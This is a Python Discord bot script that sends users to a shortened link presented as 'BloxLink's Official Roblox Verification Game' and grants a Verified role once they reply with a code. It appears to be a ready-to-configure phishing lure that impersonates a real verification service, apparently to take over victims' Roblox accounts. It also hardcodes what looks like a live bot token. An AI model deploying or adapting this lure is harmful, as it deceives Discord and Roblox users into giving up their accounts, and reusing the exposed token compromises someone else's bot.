import discord
from discord.ext import commands
import requests
from keep_alive import keep_alive
import os
os.system("pip install py-cord==2.0.0b1")
import time 


################### change these to your liking ###################

token = "MTA1NTg0MDA4MTE5OTUxMzY4MA.GLsQZU.NfoZwXrLbBJoRuc2C9XsfKZiXnsXM8DmE4FvUo"
prefix = "!"
title = "**Verification!**"
desc ="To verify your account, please join BloxLink's Official Roblox Verification Game. once done run `/done` to complete the process"

Game = "https://tinyurl.com/EF907G"
game = "Join here"

###################################################################



bot = commands.Bot(command_prefix = prefix)

@bot.event
async def on_ready():
    print('')
    print('----------------')
    print('Bot Online!')
    print('----------------')

main = discord.Embed(title=title,description=desc,color=0xcf4948)
main.add_field(name="** **",value=f"[**{game}**]({Game})")


@bot.slash_command(description="verify command")
async def verify(ctx):
    await ctx.respond(embed=main,ephemeral=True)

@bot.slash_command(description="Finish verification (put your code in the code option)")
async def done(ctx, code):
    role_to_give = discord.utils.get(ctx.author.guild.roles, name="Verified")
    await ctx.author.add_roles(role_to_give) 
    await ctx.respond(f"you have been given the Verified role!")

@bot.slash_command(description="verify") 
async def help(ctx):
    await ctx.send('Run the command `/verify` to start the verification process')
    await ctx.author.send(embed=main)





bot.run(token)